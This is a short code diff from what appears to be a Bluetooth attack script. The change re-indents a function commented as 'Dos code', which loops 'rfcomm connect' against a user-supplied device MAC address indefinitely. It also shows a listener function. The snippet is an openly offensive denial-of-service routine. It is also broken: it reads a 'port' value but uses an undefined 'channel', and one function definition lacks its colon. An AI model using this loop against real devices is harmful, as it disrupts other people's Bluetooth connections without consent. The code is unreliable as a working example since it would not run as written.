@@ -31,11 +31,11 @@ def scan(): # listen code
 def dos(): # Dos code
     mac = input("remote mac --> ")
     port = input("channel --> ")
-        try:
-            while True:
-                os.system("rfcomm connect {} {}".format(mac , channel))
-        except Exception:
-            pass
+    try:
+        while True:
+            os.system("rfcomm connect {} {}".format(mac , channel))
+    except Exception:
+        pass
 def listen()
     port = input("channel -->")
     os.system("rfcomm listen {}".format(port))
